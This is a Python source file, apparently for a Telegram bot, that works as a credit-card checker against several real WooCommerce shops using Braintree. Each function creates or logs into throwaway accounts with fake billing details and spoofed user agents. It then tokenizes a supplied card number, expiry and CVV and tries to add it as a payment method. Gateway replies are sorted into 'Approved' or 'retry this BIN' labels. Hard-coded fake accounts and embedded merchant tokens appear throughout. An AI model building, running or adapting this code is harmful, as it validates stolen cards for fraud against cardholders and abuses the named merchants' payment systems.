import os,sys
import random
import telebot
import requests,random,time,string,base64
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
import user_agent

import re

import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup



import random
import string
import threading
import time

acc = None  # تعريف متغير global لتخزين قيمة acc

def generate_random_account():
    global acc  # تعيين acc كـ global داخل الدالة
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    acc = f"{name}{number}@gmail.com"  # تعيين قيمة لـ acc
    return acc

def generate_emails_periodically():
    while True:
        generate_random_account()
      #  print(acc)
        time.sleep(0.1)

# إنشاء موضوع لتشغيل الدالة
thread = threading.Thread(target=generate_emails_periodically)
thread.start()

# الآن يمكنك الوصول إلى قيمة acc من هنا



		
		
		
		
def Tele(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent


	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	try:
	    yy = ex[2] + ex[3]
	    if '2' in ex[3] or '1' in ex[3]:
	        yy = ex[2] + '7'
	    else:
	        pass
	except:
	    yy = ex[0] + ex[1]
	    if '2' in ex[1] or '1' in ex[1]:
	        yy = ex[0] + '7'
	    else:
	        pass
	        
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()

	headers={
'User-Agent': user,
}


	json_data = {
    'email': email,
    'password': email,
}


	response = r.post(
    'https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email',
    headers=headers,
    json=json_data,
)






	headers={
'User-Agent': user,
}

	addadres = r.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	 
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', addadres.text).group(1)
	print(address)






	headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

	data = {
	'billing_first_name': 'Hussein',
	'billing_last_name': 'Alfuraijii ',
	'billing_company': '',
	'billing_country': 'CA',
	'billing_address_1': '3480 Granada Ave',
	'billing_city': 'Los Angeles ',
	'billing_state': 'AB',
	'billing_postcode': 'T7S 1E8',
	'billing_phone': '3153153152',
	'billing_email': email,
	'save_address': 'Save address',
	'woocommerce-edit-address-nonce': address,
	'_wp_http_referer': '/my-account/edit-address/billing/',
	'action': 'edit_address',
}

	response = r.post('https://shop.trifectanutrition.com/my-account/edit-address/billing/', headers=headers, data=data)








	headers={
'User-Agent': user,
}

	rrr=r.get("https://shop.trifectanutrition.com/my-account/add-payment-method/",headers=headers)
	nonce=findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',rrr.text)[0]
	client = re.search(r'client_token_nonce":"([^"]+)"', rrr.text).group(1)





	headers={
'User-Agent': user,
}

	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client,
}

	response = r.post(
    'https://shop.trifectanutrition.com/wordpress/wp-admin/admin-ajax.php',
    headers=headers,
    data=data,
)




	enc = response.json()['data']
	
	dec = base64.b64decode(enc).decode('utf-8')

	auth=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]






	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	'authorization': f'Bearer {auth}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'ae0e96cd-7aa2-418c-8fba-6627701d117c',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


	tok=(response.json()['data']['tokenizeCreditCard']['token'])





	headers={
'User-Agent': user,
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = r.post('https://shop.trifectanutrition.com/my-account/add-payment-method/', headers=headers, data=data)
	text = response.text
	
		
	pattern = r'Reason: (.+?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'added' in text or 'Payment method successfully added.' in text:
			result = "Approved ✅"
			return result
		else:
			try:
				result = text.split('Status code ')[1].split('<')[0]
			except:
				try:
					result = match
				except:
					result = 'Unknow Response'

	
	if 'risk_threshold' in result:
			return "RISK: Retry this BIN later."
	elif 'You cannot add a new payment method so soon after the previous one' in result:
		    return "Please wait for 20 seconds."
	elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
		    return 'Approved ✅'
	elif 'Duplicate card exists in the vault.' in result:
		    return 'Approved ✅! - Duplicate'
	elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
		    return 'Approved ✅! - AVS-CVV'
	elif "Invalid postal code" in result or "CVV." in result:
		    return 'Approved ✅! - Invalid postal code and cvv'
	elif "Card Issuer Declined CVV" in result:
		    return 'Approved ✅! - Declined CVV'
	elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
		    return 'Approved ✅!'
	else:
		return result
		
		
		
		
		
		
		
		
		
		
		
		

		
		
		
		
		
		










def Tele2(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	try:
	    yy = ex[2] + ex[3]
	    if '2' in ex[3] or '1' in ex[3]:
	        yy = ex[2] + '7'
	    else:
	        pass
	except:
	    yy = ex[0] + ex[1]
	    if '2' in ex[1] or '1' in ex[1]:
	        yy = ex[0] + '7'
	    else:
	        pass
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()


	headers={
'User-Agent': user,
}

	rrr=r.get("https://www.ecosmetics.com/my-account/add-payment-method/",headers=headers)
	login=findall(r'name="woocommerce-register-nonce" value="(.*?)"',rrr.text)[0]



	
	








	headers={
'User-Agent': user,
}

	data = {
    'email': email,
    'password': email,
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://www.ecosmetics.com/my-account/add-payment-method/',
    'wc_order_attribution_session_start_time': '2024-08-02 22:08:23',
    'wc_order_attribution_session_pages': '1',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'woocommerce-register-nonce': login,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'register': 'Register',
}


	response = r.post('https://www.ecosmetics.com/my-account/add-payment-method/', headers=headers, data=data)





	headers={
'User-Agent': user,
}

	 
	addadres = r.get('https://www.ecosmetics.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	 
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', addadres.text).group(1)
	print(address)






	headers={
'User-Agent': user,
}

	data = {
    'billing_first_name': 'Hussein',
    'billing_last_name': 'Alfuraijii ',
    'billing_company': '',
    'billing_country': 'US',
    'billing_address_1': '3480 Granada Ave',
    'billing_address_2': '',
    'billing_city': 'Los Angeles ',
    'billing_state': 'CA',
    'billing_postcode': '90001',
    'billing_phone': '3153153152',
    'billing_email': email,
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
}

	response = r.post('https://www.ecosmetics.com/my-account/edit-address/billing/', headers=headers, data=data)
	







	headers={
'User-Agent': user,
}

	rrr=r.get("https://www.ecosmetics.com/my-account/add-payment-method/",headers=headers)
	nonce=findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',rrr.text)[0]
	aut=rrr.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4=str(base64.b64decode(aut))
	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]





	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	'authorization': f'Bearer {auth}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'ae0e96cd-7aa2-418c-8fba-6627701d117c',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}


	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


	tok=(response.json()['data']['tokenizeCreditCard']['token'])





	headers={
'User-Agent': user,
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"aa402142489e8b963c861d5042544862","fraud_merchant_id":null,"correlation_id":"1d8424a02ce5556a6edb90ee54425d39"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/8ddh6wj6qwvpbswt/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/8ddh6wj6qwvpbswt"},"merchantId":"8ddh6wj6qwvpbswt","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"8ddh6wj6qwvpbswt","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"OnCore Golf Technology, Inc","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjI0MjcwNzAsImp0aSI6IjI3MzdhZGQ4LTk4ODQtNGYwYy04MzUwLTM4ZTNiZmZkMGI2YiIsInN1YiI6IjhkZGg2d2o2cXd2cGJzd3QiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjhkZGg2d2o2cXd2cGJzd3QiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.UFv3fsXi9wDJHfsZLJtfT-sQ59bpwfbPEy1I5HsvKxUYBp7CkUioTb0qG_IL7lZzcws_GfDBZ8D8CsdDWOujIQ","paypalClientId":"ARQ5EcBqMlYzZ9VRGrLp0uc26enUFNE7A8H47P5HokLSitrS1CaPGUy-zp4QS0EN-znueuESVGGRUfFu","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3347590979694625451","accessToken":"access_token$production$8ddh6wj6qwvpbswt$c4f366f69f3f181ca36bc6c57195c1f7","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"OnCore Golf Technology, Inc","clientId":"ARQ5EcBqMlYzZ9VRGrLp0uc26enUFNE7A8H47P5HokLSitrS1CaPGUy-zp4QS0EN-znueuESVGGRUfFu","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"oncoregolftechnologyinc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}


	response = r.post('https://www.ecosmetics.com/my-account/add-payment-method/', headers=headers, data=data)






	text = response.text
		
	pattern = r'Reason: (.+?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'added' in text or 'Payment method successfully added.' in text:
			result = "Approved ✅"
			return result
		else:
			try:
				result = text.split('Status code ')[1].split('<')[0]
			except:
				try:
					result = match
				except:
					result = 'Unknow Response'

	
	if 'risk_threshold' in result:
			return "RISK: Retry this BIN later."
	elif 'You cannot add a new payment method so soon after the previous one' in result:
		    return "Please wait for 20 seconds."
	elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
		    return 'Approved ✅'
	elif 'Duplicate card exists in the vault.' in result:
		    return 'Approved ✅! - Duplicate'
	elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
		    return 'Approved ✅! - AVS-CVV'
	elif "Invalid postal code" in result or "CVV." in result:
		    return 'Approved ✅! - Invalid postal code and cvv'
	elif "Card Issuer Declined CVV" in result:
		    return 'Approved ✅! - Declined CVV'
	elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
		    return 'Approved ✅!'
	else:
		return result
		
		



















	












def Tele3(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	try:
	    yy = ex[2] + ex[3]
	    if '2' in ex[3] or '1' in ex[3]:
	        yy = ex[2] + '7'
	    else:
	        pass
	except:
	    yy = ex[0] + ex[1]
	    if '2' in ex[1] or '1' in ex[1]:
	        yy = ex[0] + '7'
	    else:
	        pass
	print(c,mm,yy,cvc)
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()





	try:
	    open("cok.txt", "r")
	except:
	    open("cok.txt", "w").close()

	with open("cok.txt", "r") as file:
	    first_line = file.readline().strip()

# تخزين آخر وقت تم فيه اختيار كل حساب
	last_used_times = {}

	while True:
	    lines = """bmwiraqy9074@gmail.com"""
	    lines = lines.strip().split("\n")
	    random_line_number = random.randint(0, len(lines) - 1)
	    cookei = lines[random_line_number]

    # الحصول على الوقت الحالي
	    current_time = time.time()

    # التحقق مما إذا كان الحساب قد تم استخدامه مؤخرًا
	    if cookei in last_used_times:
	        time_since_last_use = current_time - last_used_times[cookei]
	        if time_since_last_use < 20:
	            continue  # تجاهل هذا الحساب واختيار حساب آخر

	    if cookei == first_line:
	        pass
	    else:
	        last_used_times[cookei] = current_time
	        break

	with open("cok.txt", "w") as file:
	    file.write(cookei)
	    print(cookei)


	headers={
'User-Agent': user,
}

	rrr=r.get("https://sensorex.com/my-account/add-payment-method/",headers=headers)
	login=findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]



	headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

	data = {
    'username': cookei,
    'password': '123bmS1234',
    'woocommerce-login-nonce': login,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
}

	response = r.post('https://sensorex.com/my-account/add-payment-method/', headers=headers, data=data)


	heaf = {
'User-Agent': user,
}
	rrr = r.get("https://sensorex.com/my-account/add-payment-method/", headers=heaf)

	nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', rrr.text)[0]
	client = re.search(r'client_token_nonce":"([^"]+)"', rrr.text).group(1)


	data = {
	'action': 'wc_braintree_credit_card_get_client_token',
	'nonce': client,
}

	response = r.post('https://sensorex.com/wp-admin/admin-ajax.php', headers=headers, data=data)




	enc = response.json()['data']
	 
	dec = base64.b64decode(enc).decode('utf-8')
	 
	auth=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]

	print(auth)
	print(nonce)







	headers = {
	'authority': 'payments.braintree-api.com',
	'accept': '*/*',
	'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	'authorization': f'Bearer {auth}',
	'braintree-version': '2018-05-10',
	'content-type': 'application/json',
	'origin': 'https://assets.braintreegateway.com',
	'referer': 'https://assets.braintreegateway.com/',
	'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	'sec-ch-ua-mobile': '?1',
	'sec-ch-ua-platform': '"Android"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'cross-site',
	'user-agent': user,
}

	json_data = {
	'clientSdkMetadata': {
	'source': 'client',
	'integration': 'custom',
	'sessionId': '31446d87-50b3-423b-a81f-6762e028d872',
	},
	'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   bin	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {	 prepaid	 healthcare	 debit	 durbinRegulated	 commercial	 payroll	 issuingBank	 countryOfIssuance	 productId	   }	 }   } }',
	'variables': {
	'input': {
		'creditCard': {
		'number': c,
		'expirationMonth': mm,
		'expirationYear': yy,
		'cvv': cvc,
		},
		'options': {
		'validate': False,
		},
	},
	},
	'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	print(tok)
	
	headers = {
'User-Agent': user,
}



	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'visa',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
	response = r.post('https://sensorex.com/my-account/add-payment-method/', headers=headers, data=data)
	

	soup = BeautifulSoup(response.text, 'html.parser')
	try:
		try:
			msg = soup.find('ul', class_='woocommerce-error').text.strip().split(":")[1]
			color="\033[1;31m"
		except:
			msg = soup.find('ul', class_='woocommerce-error').text.strip()
		kopi = msg
		if 'risk_threshold' in kopi:
			return "RISK: Retry this BIN later."
		elif 'You cannot add a new payment method so soon after the previous one' in kopi:
		    return "Please wait for 20 seconds."
		elif 'Nice! New payment method added' in kopi or 'Payment method successfully added.' in kopi:
		    return 'Approved ✅! - Added'
		elif 'Duplicate card exists in the vault.' in kopi:
		    return 'Approved ✅! - Duplicate'
		elif "avs: Gateway Rejected: avs" in kopi or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in kopi or "cvv: Gateway Rejected: cvv" in kopi:
		    return 'Approved ✅! - AVS-CVV'
		elif "Invalid postal code" in kopi or "CVV." in kopi:
		    return 'Approved ✅! - Invalid postal code and cvv'
		elif "Card Issuer Declined CVV" in kopi:
		    return 'Approved ✅! - Declined CVV'
		elif not re.search(r'[A-Za-z]', msg) and not re.search(r'[0-9]', msg):
		    return 'Approved ✅!'
		else:
			return kopi

	except:
		msg = response.text

















def notauto(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	try:
	    yy = ex[2] + ex[3]
	    if '2' in ex[3] or '1' in ex[3]:
	        yy = ex[2] + '7'
	    else:
	        pass
	except:
	    yy = ex[0] + ex[1]
	    if '2' in ex[1] or '1' in ex[1]:
	        yy = ex[0] + '7'
	    else:
	        pass
	print(c,mm,yy,cvc)
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()





	try:
	    open("cok.txt", "r")
	except:
	    open("cok.txt", "w").close()

	with open("cok.txt", "r") as file:
	    first_line = file.readline().strip()

# تخزين آخر وقت تم فيه اختيار كل حساب
	last_used_times = {}

	while True:
	    lines = """aopzstu@hi2.in
xlwlwbrz@hi2.in
wkadykmy@hi2.in
fxfilzkg@hi2.in
ssyyxs@hi2.in
flyyzy@hi2.in
yztiktnu@hi2.in
tgvxjj@hi2.in
fprmgl@hi2.in
pjgnhskm@hi2.in
yorwbq@hi2.in
vyojxvn@hi2.in
kgofpm@hi2.in
akrvqub@hi2.in
oihiiyjx@hi2.in
itjyxf@hi2.in
sbwomimy@hi2.in
muoqi@hi2.in
qzykpe@hi2.in
edtenh@hi2.in
lkuctxq@hi2.in
nmdspv@hi2.in
vcpumxg@hi2.in
aiudqg@telegmail.com
fpubjn@telegmail.com
btlax@telegmail.com
xigdpidl@telegmail.com
idlslsf@telegmail.com
asozd@telegmail.com
ctxzf@hi2.in
habvt@telegmail.com
jbssxfk@telegmail.com
egfamht@hi2.in
bbqglo@hi2.in
kbjeata@hi2.in
ufwry@hi2.in
ilyifgz@hi2.in
uuxkrvob@hi2.in
ycojmc@hi2.in
rhbummaa@hi2.in"""
	    lines = lines.strip().split("\n")
	    random_line_number = random.randint(0, len(lines) - 1)
	    cookei = lines[random_line_number]

    # الحصول على الوقت الحالي
	    current_time = time.time()

    # التحقق مما إذا كان الحساب قد تم استخدامه مؤخرًا
	    if cookei in last_used_times:
	        time_since_last_use = current_time - last_used_times[cookei]
	        if time_since_last_use < 20:
	            continue  # تجاهل هذا الحساب واختيار حساب آخر

	    if cookei == first_line:
	        pass
	    else:
	        last_used_times[cookei] = current_time
	        break

	with open("cok.txt", "w") as file:
	    file.write(cookei)
	    print(cookei)


	heaf = {
'User-Agent': user,
}
	get = r.get("https://ifeat.org/my-account/", headers=heaf)


	headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

	data = {
    'login_username': cookei,
    'login_password': '123bmS1234',
    'login_remember': 'true',
    'login_submit': 'Sign In',
    'login_redirect': 'https://ifeat.org/my-account/',
    'login_form_id': '3',
    'pp_current_url': 'https://ifeat.org/my-account/',
    'login_referrer_page': '',
}

	response = r.post('https://ifeat.org/my-account/payment-methods/', headers=headers, data=data)

	heaf = {
'User-Agent': user,
}
	rrr = r.get("https://ifeat.org/my-account/add-payment-method/", headers=heaf)

	nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', rrr.text)[0]
	client = re.search(r'client_token_nonce":"([^"]+)"', rrr.text).group(1)


	data = {
	'action': 'wc_braintree_credit_card_get_client_token',
	'nonce': client,
}

	response = r.post('https://ifeat.org/wp-admin/admin-ajax.php', headers=headers, data=data)




	enc = response.json()['data']
	 
	dec = base64.b64decode(enc).decode('utf-8')
	 
	auth=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]

	print(auth)
	print(nonce)







	headers = {
	'authority': 'payments.braintree-api.com',
	'accept': '*/*',
	'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	'authorization': f'Bearer {auth}',
	'braintree-version': '2018-05-10',
	'content-type': 'application/json',
	'origin': 'https://assets.braintreegateway.com',
	'referer': 'https://assets.braintreegateway.com/',
	'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	'sec-ch-ua-mobile': '?1',
	'sec-ch-ua-platform': '"Android"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'cross-site',
	'user-agent': user,
}

	json_data = {
	'clientSdkMetadata': {
	'source': 'client',
	'integration': 'custom',
	'sessionId': '31446d87-50b3-423b-a81f-6762e028d872',
	},
	'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   bin	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {	 prepaid	 healthcare	 debit	 durbinRegulated	 commercial	 payroll	 issuingBank	 countryOfIssuance	 productId	   }	 }   } }',
	'variables': {
	'input': {
		'creditCard': {
		'number': c,
		'expirationMonth': mm,
		'expirationYear': yy,
		'cvv': cvc,
		},
		'options': {
		'validate': False,
		},
	},
	},
	'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	print(tok)
	
	headers = {
'User-Agent': user,
}



	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'visa',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = r.post('https://ifeat.org/my-account/add-payment-method/', headers=headers, data=data)
	

	text = response.text
		
	pattern = r'Reason: (.+?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'added' in text or 'Payment method successfully added.' in text:
			result = "Approved ✅"
			return result
		else:
			try:
				result = text.split('Status code ')[1].split('<')[0]
			except:
				try:
					result = match
				except:
					result = 'Unknow Response'

	
	if 'risk_threshold' in result:
			return "RISK: Retry this BIN later."
	elif 'You cannot add a new payment method so soon after the previous one' in result:
		    return "Please wait for 20 seconds."
	elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
		    return 'Approved ✅'
	elif 'Duplicate card exists in the vault.' in result:
		    return 'Approved ✅! - Duplicate'
